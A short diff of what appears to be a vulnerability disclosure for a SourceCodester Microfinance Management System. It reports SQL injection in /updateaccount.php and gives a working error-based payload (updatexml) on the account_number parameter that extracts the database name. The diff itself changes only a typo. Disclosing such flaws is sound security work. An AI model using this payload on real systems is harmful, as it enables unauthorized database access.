@@ -4,7 +4,7 @@
 
 Supplier:https://www.sourcecodester.com/php/14822/microfinance-management-system.html
 
- /updateaccount.php has SQL injection
+ /updateaccount.php has SQL injectiond
 
 Payload:account_number=' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
 
